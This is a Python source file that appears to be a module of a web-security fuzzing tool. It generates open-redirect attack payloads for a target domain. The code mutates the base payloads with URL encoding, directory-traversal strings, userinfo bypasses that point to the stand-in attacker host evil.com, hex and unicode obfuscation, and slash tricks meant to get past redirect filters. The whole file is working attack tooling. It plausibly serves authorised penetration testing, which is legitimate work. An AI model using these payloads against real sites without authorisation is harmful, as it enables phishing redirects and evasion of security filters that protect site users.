import urllib.parse
from pluck.module import GenerationModule


class OpenRedirectionPayloadGenerator(GenerationModule):
    def __init__(self, domain="127.0.0.1"):
        super().__init__()
        self.base_payloads = set()
        self.mutated_payloads = set()

        self.domain = domain


    def generate_payloads(self):
        """Generate mutated open redirection payloads for the given target domain."""
        self.base_payloads = {
            f'http://{self.domain}',
            f'https://{self.domain}',
            f'//{self.domain}',
            f'/{self.domain}',
            f'///{self.domain}',
            f'\\\\{self.domain}'
        }

        for payload in self.base_payloads:
            self.mutated_payloads.add(payload)

            # Mutációs technikák alkalmazása
            for mutation_func in [
                self.url_encode,
                self.path_traversal_mutation,
                self.userinfo_bypass,
                self.obfuscation_mutation,
                self.slash_manipulation
            ]:
                for mutated in mutation_func(payload, self.domain):
                    self.mutated_payloads.add(mutated)

        return list(self.mutated_payloads)

    # Mutációs technikák
    def url_encode(self, payload, domain):
        return [urllib.parse.quote(payload)]

    def path_traversal_mutation(self, payload, domain ):
        return [
            f'{payload}/%2e%2e',  # Encoded directory traversal
            f'{payload}/..',      # Plain directory traversal
            f'{payload}/%2e%2e%2f'  # Encoded double traversal
        ]

    def userinfo_bypass(self, payload, domain):
        return [
            f'http://{self.domain}@evil.com',
            f'http://127.0.0.1@{self.domain}',
            f'http://evil.com/%2F%2F{self.domain}'  # Nested slashes to confuse filters
        ]

    def obfuscation_mutation(self,payload, domain):
        hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in self.domain)
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in self.domain)
        return [
            f'http://{hex_encoded}',
            f'http://{unicode_encoded}'
        ]

    def slash_manipulation(self,payload, domain):
        return [
            f'/\\{self.domain}',      # Backslash obfuscation
            f'///{self.domain}',      # Triple slashes
            f'////{self.domain}/',    # Quadruple slashes
        ]

   

